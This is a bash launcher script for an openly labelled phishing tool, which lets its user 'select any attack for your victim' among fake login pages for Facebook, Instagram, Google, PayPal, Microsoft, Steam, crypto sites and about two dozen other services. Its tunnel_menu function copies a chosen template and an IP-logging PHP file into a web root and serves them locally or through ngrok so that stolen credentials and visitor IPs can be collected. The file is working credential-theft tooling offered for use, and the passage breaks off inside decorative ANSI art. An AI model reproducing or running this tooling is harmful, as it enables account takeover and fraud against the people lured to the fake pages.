#!/bin/bash

trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
printf "\e[0m\n"
printf "\e[0m\e[1;36m\t              TRYING TO EXIT !!\n"
sleep 2
echo ""
echo  $green"                   THANKS FOR USING MY TOOL " |lolcat
echo ""
exit 1
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

}

reqs() {

command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v ssh > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }

if [[ -d .htr ]]; then
printf ""
else
printf "\n\e[0m\e[96m Packages are not Found ! type \e[0m\e[93mbash install.sh\e[0m\n\n"
exit 1 
fi

if [[ -d .Modules ]]; then
printf ""
else
printf "\n\e[0m\e[96m Packages are not Found ! type \e[0m\e[93mbash install.sh\e[0m\n\n"
exit 1 
fi

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

}

banner() {

clear

printf "\e[0m\n" 
printf "\e[0m\e[37m████████ ██████     \e[0m\e[1;33m\e[0m\e[96m    ███████ ██ ███████ ██   ██ ███████ ██████\e[0m\n"
printf "\e[0m\e[37m   ██         ██      \e[0m\e[1;33m\e[0m\e[96m  ██      ██ ██      ██   ██ ██      ██   ██\e[0m\n"
printf "\e[0m\e[37m   ██     █████  █████\e[0m\e[1;33m\e[0m\e[96m  █████   ██ ███████ ███████ █████   ██████\e[0m\n"
printf "\e[0m\e[37m   ██    ██           \e[0m\e[1;33m\e[0m\e[96m  ██      ██      ██ ██   ██ ██      ██   ██\e[0m\n"
printf "\e[0m\e[37m   ██    ███████     \e[0m\e[1;33m\e[0m\e[96m   ██      ██ ███████ ██   ██ ███████ ██   ██\e[0m\n"
printf "\e[0m\n"
echo -TC "_____________________________________________________________" | lolcat
echo -TC "TYPE      : PHISHING TOOL $green " |lolcat
echo -TC "VERSION   : 1.0v " | lolcat
echo -TC "TEMPLATES : 20+ TEMPLATES " | lolcat
echo -TC "AUTHOR    : NADEEM & HACKER $green " |lolcat
echo -TC "INSTAGRAM : https://Instagram.com/Nadeem $green " |lolcat
echo -TC "INSTAGRAM : https://Instagram.com/nadeem $green " |lolcat
echo -TC "CONTACT   : +92 355 8038021 (NADEEMHACKING) $green " |lolcat
echo -TC "CONTACT   :  +92 355 8038021 (NADEEMHACKER)  " | lolcat
echo -TC "_____________________________________________________________" | lolcat

}

smallbanner() {

clear

printf "\e[0m                                                    \e[0m\n"
printf "\e[0m                                                    \e[0m\n"
printf "\e[0m                    \e[38;5;214m▄▄\e[48;5;214m█\e[48;5;179m▀\e[48;5;233m▀\e[0m                \e[38;5;214m▀\e[48;5;214m██\e[48;5;233m▄▄\e[0m                \e[0m\n"
printf "\e[0m                   \e[38;5;208;48;5;215m▄\e[48;5;214m▄\e[48;5;208m█\e[38;5;172;48;5;233m▀\e[0m                    \e[38;5;208;48;5;237m▀\e[48;5;214m▄▄\e[38;5;178m▀\e[0m               \e[0m\n"
printf "\e[0m                  \e[38;5;166;48;5;173m▄\e[38;5;208;48;5;208m█▀▀\e[0m                      \e[38;5;208;48;5;208m█▀\e[38;5;166m▄\e[38;5;52;48;5;131m▀\e[0m              \e[0m\n"
printf "\e[0m                  \e[38;5;16m▀\e[38;5;166;48;5;166m \e[38;5;202m▀\e[48;5;202m█\e[48;5;166m▀\e[38;5;124;48;5;233m▄\e[38;5;202m▄\e[38;5;16;48;5;131m▀\e[0m   \e[38;5;208m▄▄▄▄▄▄▄▄\e[0m   \e[38;5;130m▄\e[38;5;202m▄\e[38;5;124m▄\e[48;5;202m▄\e[38;5;202m█\e[48;5;166m▀\e[38;5;166m \e[0m               \e[0m\n"
printf "\e[0m                    \e[38;5;124;48;5;52m▀\e[48;5;124m█\e[38;5;88;48;5;167m▀\e[38;5;124;48;5;202m▄▄\e[38;5;202m  \e[38;5;124m▄\e[38;5;166;48;5;166m \e[38;5;160;48;5;208m▄\e[38;5;202;48;5;202m      \e[38;5;160;48;5;208m▄\e[38;5;166;48;5;166m▄\e[38;5;124;48;5;202m▄\e[38;5;202m  \e[38;5;124m▄▄\e[38;5;88;48;5;166m▀\e[38;5;124;48;5;124m█\e[48;5;234m▀\e[0m                \e[0m\n"
printf "\e[0m                    \e[38;5;131m▄\e[38;5;167m▄\e[38;5;124;48;5;173m▀\e[38;5;166;48;5;124m▄\e[38;5;160;48;5;160m█\e[38;5;124m▀\e[38;5;88m▀\e[48;5;124m▀\e[38;5;202;48;5;202m \e[38;5;124;48;5;203m▄\e[48;5;124m█\e[48;5;202m▄\e[38;5;196m▄▄\e[38;5;124m▄\e[38;5;160;48;5;160m█\e[38;5;202;48;5;202m▀ \e[38;5;88;48;5;124m▀\e[48;5;160m▀\e[38;5;124m▀\e[38;5;160m█\e[38;5;52;48;5;167m▀\e[38;5;124;48;5;173m▀\e[38;5;131;48;5;233m▄\e[38;5;167m▄\e[0m                \e[0m\n"
printf "\e[0m                     \e[38;5;16;48;5;160m▄\e[38;5;124;48;5;124m \e[48;5;160m▀\e[48;5;124m▀▀\e[48;5;88m▀\e[38;5;88;48;5;161m▀\e[38;5;124;48;5;232m▀\e[48;5;124m█\e[38;5;160;48;5;160m \e[38;5;203m▀\e[38;5;124;48;5;124m▀\e[48;5;88m▀\e[38;5;166;48;5;160m▀\e[38;5;160m \e[38;5;124;48;5;202m▄\e[38;5;166;48;5;233m▀\e[38;5;88;48;5;161m▀\e[38;5;124;48;5;88m▀\e[48;5;124m▀▀\e[48;5;160m▀\e[38;5;88m▀\e[38;5;16m▄\e[0m                 \e[0m\n"
printf "\e[0m                       \e[38;5;88m▀▀\e[38;5;52m▀\e[48;5;232m▀\e[38;5;125;48;5;125m█ \e[38;5;232m▀\e[38;5;88;48;5;53m▀\e[38;5;160;48;5;124m▄\e[48;5;202m▄▄\e[38;5;124;48;5;160m▄\e[38;5;52;48;5;124m▄\e[38;5;16;48;5;125m▀\e[38;5;125m █\e[38;5;52;48;5;233m▀▀\e[38;5;88m▀▀\e[0m                   \e[0m\n"
printf "\e[0m                            \e[38;5;53;48;5;126m▄\e[38;5;125;48;5;125m▄\e[48;5;89m▀\e[48;5;125m \e[38;5;161;48;5;161m  \e[38;5;125;48;5;125m \e[48;5;89m▀\e[48;5;125m▄\e[38;5;89;48;5;89m▀\e[0m                        \e[0m\n"
printf "\e[0m                             \e[38;5;89;48;5;53m▀\e[38;5;127m▄\e[38;5;53m▀\e[38;5;90;48;5;90m  \e[38;5;89;48;5;53m▀\e[38;5;127m▄\e[38;5;89m▀\e[0m                         \e[0m\n"
printf "\e[0m                             \e[38;5;91;48;5;55m▀\e[48;5;17m▀\e[38;5;19;48;5;134m▄\e[48;5;56m▄▄\e[48;5;134m▄\e[38;5;90;48;5;17m▀\e[38;5;91;48;5;55m▀\e[0m                         \e[0m\n"
printf "\e[0m                              \e[38;5;18;48;5;17m▀\e[48;5;24m▀\e[48;5;25m▀▀\e[48;5;18m▀\e[48;5;17m▀\e[0m                          \e[0m\n"
printf "\e[0m                                                    \e[0m\n"
printf "\e[0m"
echo -e "                 DON'T ASK TO HACK! JUST HACK IT!"|lolcat
echo " "
echo -e $'\e[1;37m\e[0m\e[1;37m  <<+-+-+-+-+-+-+-+-+-+ WANTS TO LEARN HACKING ? +-+-+-+-+-+-+-+-+-+>>\e[0m'|lolcat
echo " "
echo -e " <×•••••••••••••••••• JOIN US ON TELEGRAM ••••••••••••••••••••×>"|lolcat
echo " "

}

menu() {

echo ""
echo -e "#########################################################" | lolcat
echo -e "     # SELECT ANY ATTACK FOR YOUR VICTIM #" | lolcat
echo -e "#########################################################" | lolcat
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[0m\e[96m Twitch      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[0m\e[96m DeviantArt\e[0m\n" 
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Instagram   \e[0m\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[0m\e[96m Pinterest   \e[0m\e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[0m\e[96m Badoo\e[0m\n" 
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m Google      \e[0m\e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[0m\e[96m Snapchat    \e[0m\e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[0m\e[96m Origin\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[0m\e[96m Microsoft   \e[0m\e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[0m\e[96m Linkedin    \e[0m\e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[0m\e[96m CryptoCoin\e[0m\n"  
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[0m\e[96m Netflix     \e[0m\e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[0m\e[96m Ebay        \e[0m\e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[0m\e[96m Yahoo\e[0m\n"    
printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[0m\e[96m Paypal      \e[0m\e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[0m\e[96m Dropbox\e[0m\n" 
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[0m\e[96m Steam       \e[0m\e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[0m\e[96m Protonmail\e[0m\n"         
printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[0m\e[96m Twitter     \e[0m\e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[0m\e[96m Spotify     \e[0m\e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[0m\e[96m About\e[0m\n"                              
printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[0m\e[96m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[0m\e[96m Reddit      \e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m]\e[0m\e[0m\e[96m Exit\e[0m\n"                 
printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[0m\e[96m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[0m\e[96m Adobe\e[0m\n"   
printf "\e[0m\n"
echo -e "╭─[TECHNOCYBER]" |lolcat
read -p "   ╰─root@2Timeowl=" menu_option

if [[ $menu_option == 1 || $menu_option == 01 ]]; then
facebook
elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
instagram
elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
gmail
elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
website="microsoft"
tunnel_menu
elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
website="netflix"
tunnel_menu
elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
website="paypal"
tunnel_menu
elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
website="steam"
tunnel_menu
elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
website="twitter"
tunnel_menu
elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
website="playstation"
tunnel_menu
elif [[ $menu_option == 10 ]]; then
website="github"
tunnel_menu
elif [[ $menu_option == 11 ]]; then
website="twitch"
tunnel_menu
elif [[ $menu_option == 12 ]]; then
website="pinterest"
tunnel_menu
elif [[ $menu_option == 13 ]]; then
website="snapchat"
tunnel_menu
elif [[ $menu_option == 14 ]]; then
website="linkedin"
tunnel_menu
elif [[ $menu_option == 15 ]]; then
website="ebay"
tunnel_menu
elif [[ $menu_option == 16 ]]; then
website="dropbox"
tunnel_menu
elif [[ $menu_option == 17 ]]; then
website="protonmail"
tunnel_menu
elif [[ $menu_option == 18 ]]; then
website="spotify"
tunnel_menu
elif [[ $menu_option == 19 ]]; then
website="reddit"
tunnel_menu
elif [[ $menu_option == 20 ]]; then
website="adobe"
tunnel_menu
elif [[ $menu_option == 21 ]]; then
website="deviantart"
tunnel_menu
elif [[ $menu_option == 22 ]]; then
website="badoo"
tunnel_menu
elif [[ $menu_option == 23 ]]; then
website="origin"
tunnel_menu
elif [[ $menu_option == 24 ]]; then
website="cryptocoinsniper"
tunnel_menu
elif [[ $menu_option == 25 ]]; then
website="yahoo"
tunnel_menu
elif [[ $menu_option == 26 ]]; then
website="wordpress"
tunnel_menu
elif [[ $menu_option == 27 ]]; then
website="yandex"
tunnel_menu
elif [[ $menu_option == 28 ]]; then
website="stackoverflow"
tunnel_menu
elif [[ $menu_option == 29 ]]; then
vk
elif [[ $menu_option == 30 ]]; then
website="xbox"
tunnel_menu
elif [[ $menu_option == 99 ]]; then
about
elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Technocyber for more\e[0m\n"
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Punker-Bhai for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[0m\e[96m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

clear
facebook(){
printf "   \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Traditional Login Page\e[0m\n"
printf "   \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Advanced Voting Poll Login Page\e[0m\n"
printf "   \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m Fake Security Login Page\e[0m\n"
printf "   \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[0m\e[96m Facebook Messenger Login Page\e[0m\n"
echo ""
echo -e "╭─[TECHNOCYBER]" |lolcat
read -p "   ╰─root@2Timeowl=" fb_option

if [[ $fb_option == 1 || $fb_option == 01 ]]; then
website="facebook"
tunnel_menu
elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
website="fb_advanced"
tunnel_menu
elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
website="fb_security"
tunnel_menu
elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
website="fb_messenger"
tunnel_menu

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[0m\e[96m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
instagram(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Auto Followers Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m Blue Badge Verify Login Page\e[0m\n"
printf "\e[0m\n"
echo -e "╭─[TECHNOCYBER]" |lolcat
read -p "   ╰─root@2Timeowl=" ig_option


if [[ $ig_option == 1 || $ig_option == 01 ]]; then
website="instagram"
tunnel_menu
elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
website="ig_followers"
tunnel_menu
elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
website="ig_verify"
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[0m\e[96m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
gmail(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Gmail Old Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Gmail New Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
echo -e "╭─[TECHNOCYBER]" |lolcat
read -p "   ╰─root@2Timeowl=" gmail_option


if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
website="google"
tunnel_menu
elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
website="google_new"
tunnel_menu
elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
website="google_poll"
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[0m\e[96m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
vk(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
echo -e "╭─[TECHNOCYBER]" |lolcat
read -p "   ╰─root@2Timeowl=" vk_option

if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[0m\e[96m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

about() {

clear
sleep 2
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[93m ____  ___      ____  ____  ___  _   _  ____  ____ \e[0m\n"
printf "\e[0m\e[93m(_  _)(__ \ ___( ___)(_  _)/ __)( )_( )( ___)(  _ \\e[0m\n"
printf "\e[0m\e[96m  )(   / _/(___))__)  _)(_ \__ \ ) _ (  )__)  )   /\e[0m\n"
printf "\e[0m\e[96m (__) (____)   (__)  (____)(___/(_) (_)(____)(_)\_)   {V: 1.0}\e[0m\n"
printf "\e[0m\n"
printf "    \e[0m\e[1;44m Most Advanced Phishing Tool of 2021 with 20+ Templates\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m NADEEM & BILAL \e[0m\e[91m[\e[0m\e[93m IRI70 \e[0m\e[91m]\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/TechnoCyber\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  GITHUB \e[0m\e[91m  : \e[0m\e[96mhttps://github.com/Punker-Bhai\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  VERSION \e[0m\e[91m    : \e[0m\e[93m1.0\e[0m\n"
printf "\e[0m\n"
printf "         \e[0m\e[1;44m Follow Our Github For More Tools \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
sleep 3
printf " \e[0m\e[91m[\e[0m00\e[0m\e[91m]\e[0m\e[93m Home           \e[0m\e[91m[\e[0m99\e[0m\e[91m]\e[0m\e[93m Exit\e[0m\n"
printf "\e[0m\n"
echo -e "╭─[TECHNOCYBER]" |lolcat
read -p "   ╰─root@2Timeowl=" about_option

if [[ $about_option == 0 || $about_option == 00 ]]; then
sleep 1
banner
menu
elif [[ $about_option == 99 ]]; then
sleep 1
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/TechnoCyber for more\e[0m\n"
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Punker-bhai for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[0m\e[96m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

tunnel_menu() {

if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

cp -rf .Modules/$website/* .htr/www
cp -f .Modules/ip.php .htr/www/

def_tunnel_menu="2"
smallbanner
echo -e " =*=*=*=*=*=*=*=*=* SELECT A PORT FORWARDING OPTION =*=*=*=*=*=*=*=*=*=*"
echo -e "\e[96m                        T2-FISHER PORT FORWARDING\e[96m"|lolcat
echo -e "\e[96m                        ╔═══════════════════════╗\e[0m"
echo -e "\e[91m                        ║\e[93m    FOR LOCAL HOST    \e[91m ║\e[0m"                                                             
echo -e "\e[91m                        ║        \e[93mType\e[92m 01\e[91m        ║\e[0m"
echo -e "\e[96m                        ║                       ║\e[91m"                                                                         
echo -e "\e[96m                        ║         (Or)          ║\e[96m"
echo -e "\e[96m                        ║                       ║\e[96m"
echo -e "\e[91m                        ║ \e[93m     FOR NGROK       \e[91m ║\e[0m"              
echo -e "\e[91m                        ║        \e[93mType\e[92m 02\e[91m        ║\e[0m"
echo -e "\e[96m                        ║                       ║"
echo -e "\e[96m                        ╚═══════════════════════╝"
printf "\e[0m\n"
echo -e "╭─[TECHNOCYBER]" |lolcat
read -p "   ╰─root@2Timeowl=" tunnel_menu
tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_ngrok
elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
start_serveo
elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
start_loclx
elif [[ $tunnel_menu == 5 || $tunnel_menu == 05 ]]; then
start_localhostrun

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[0m\e[96m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

start_localhost() {

printf "\e[0m\n"
echo " ----------------------------------------->>>>>"|lolcat
printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m      Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
echo " ----------------------------------------->>>>>"|lolcat
sleep 2

#THANKS BILAL FOR LOGO

printf "\e[0m\n"
printf "\e[0m            \e[0m                           \e[0m            \e[0m\n"
printf "\e[0m         \e[0m           \e[38;5;30m▄▄▄\e[48;5;37m▀\e[48;5;233m▄▄▄\e[0m               \e[0m         \e[0m\n"
printf "\e[0m     \e[0m \e[0m \e[0m           \e[38;5;24m▄\e[38;5;31;48;5;31m         \e[38;5;30;48;5;233m▄\e[0m                \e[0m      \e[0m\n"
printf "\e[0m      \e[0m           \e[38;5;24m▄\e[38;5;31;48;5;31m           \e[38;5;24;48;5;233m▄\e[0m                \e[0m     \e[0m\n"
printf "\e[0m    \e[0m            \e[38;5;24m▄\e[38;5;31;48;5;31m             \e[38;5;24;48;5;233m▄\e[0m                \e[0m \e[0m \e[0m  \e[0m\n"
printf "\e[0m  \e[0m             \e[38;5;24m▄\e[38;5;72;48;5;31m▄\e[48;5;17m▀\e[48;5;233m▀\e[48;5;17m▀\e[48;5;233m▀\e[48;5;25m▀\e[38;5;23;48;5;31m▄\e[38;5;72m▄\e[38;5;23m▄\e[38;5;72;48;5;17m▀\e[48;5;233m▀\e[48;5;25m▀\e[48;5;18m▀\e[48;5;233m▀\e[48;5;31m▄\e[38;5;24;48;5;233m▄\e[0m                 \e[0m  \e[0m\n"
printf "\e[0m  \e[0m            \e[38;5;30m▄\e[38;5;36;48;5;17m▀\e[38;5;24m▄\e[38;5;17m \e[38;5;24;48;5;232m▀\e[48;5;233m▀\e[38;5;16;48;5;25m▄\e[0m \e[38;5;24m▀▀\e[38;5;17m \e[38;5;16;48;5;25m▄\e[38;5;17;48;5;233m▀\e[48;5;17m \e[38;5;24;48;5;233m▀\e[38;5;17;48;5;232m▀\e[38;5;24;48;5;17m▄\e[38;5;36m▀\e[38;5;37m▄\e[0m                \e[0m \e[0m \e[0m\n"
printf "\e[0m  \e[0m          \e[0m  \e[38;5;37;48;5;37m█\e[0m \e[38;5;23;48;5;233m▀\e[38;5;30;48;5;232m▄\e[38;5;231m▀\e[48;5;231m▄\e[48;5;255m▄\e[0m \e[0m   \e[38;5;234m▀\e[38;5;231;48;5;231m▄█\e[48;5;232m▀\e[38;5;72m▄\e[38;5;24;48;5;233m▀\e[0m \e[38;5;36;48;5;37m▀\e[0m  \e[0m              \e[0m  \e[0m\n"
printf "\e[0m           \e[0m   \e[38;5;25;48;5;25m \e[38;5;23;48;5;31m▀\e[0m \e[38;5;149;48;5;233m▀\e[48;5;150m▀\e[38;5;37;48;5;233m▄▄▄\e[48;5;37m   \e[48;5;233m▄▄▄\e[38;5;149;48;5;150m▀\e[48;5;233m▀\e[0m \e[38;5;23;48;5;31m▀\e[38;5;25;48;5;25m \e[0m    \e[0m              \e[0m\n"
printf "\e[0m \e[0m         \e[0m     \e[38;5;25;48;5;25m \e[38;5;31m▀\e[48;5;17m▄\e[0m \e[38;5;36;48;5;149m▀\e[48;5;36m███████\e[48;5;149m▀\e[0m \e[38;5;31;48;5;17m▄\e[48;5;25m▀\e[38;5;24;48;5;24m \e[0m      \e[0m             \e[0m\n"
printf "\e[0m         \e[0m       \e[38;5;25;48;5;25m  \e[38;5;31;48;5;31m \e[38;5;24;48;5;233m▄\e[38;5;71;48;5;17m▀\e[38;5;149;48;5;72m▄\e[38;5;72m▄▄▄\e[38;5;149m▄\e[38;5;71;48;5;233m▀\e[38;5;24m▄\e[38;5;31;48;5;31m \e[38;5;24;48;5;24m \e[38;5;25;48;5;25m \e[0m       \e[0m             \e[0m\n"
printf "\e[0m         \e[0m   \e[38;5;16;48;5;24m▀▀\e[38;5;24m    \e[38;5;25;48;5;25m  \e[38;5;18;48;5;18m \e[38;5;31m▀\e[38;5;38;48;5;38m \e[38;5;149m▀\e[38;5;31;48;5;31m \e[38;5;24;48;5;18m▀\e[38;5;18m \e[38;5;25;48;5;25m  \e[38;5;24;48;5;24m \e[38;5;25;48;5;25m \e[38;5;24;48;5;24m   \e[38;5;16m \e[0m\e[0m   \e[0m             \e[0m\n"
printf "\e[0m         \e[0m \e[38;5;16;48;5;24m▀\e[38;5;24m       \e[48;5;17m▀\e[38;5;17m    ▀ ▄▄▀\e[38;5;24m▀\e[48;5;24m   ▄  ▀\e[48;5;17m▄\e[0m             \e[0m\n"
printf "\e[0m        \e[38;5;30m▄\e[38;5;24;48;5;24m  \e[38;5;72;48;5;23m▄\e[38;5;149;48;5;72m▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[48;5;78m▀\e[48;5;72m▀▀▀▀▀▀▀▀\e[38;5;23m▀\e[38;5;24;48;5;24m  \e[38;5;30;48;5;233m▄\e[0m            \e[0m\n"
printf "\e[0m \e[0m       \e[38;5;24;48;5;24m▀  \e[38;5;36;48;5;36m████████████\e[48;5;79m▄\e[48;5;36m███\e[48;5;73m▄▀\e[48;5;36m███████\e[38;5;24;48;5;24m   \e[0m            \e[0m\n"
printf "\e[0m \e[0m      \e[38;5;31;48;5;24m▄\e[38;5;24m   \e[38;5;36;48;5;36m█████████\e[38;5;30;48;5;30m█\e[38;5;36;48;5;36m█████████\e[38;5;37;48;5;37m█\e[38;5;36;48;5;36m█\e[38;5;37;48;5;37m██\e[38;5;36;48;5;36m██\e[38;5;24;48;5;24m   \e[38;5;30;48;5;37m▀\e[0m           \e[0m\n"
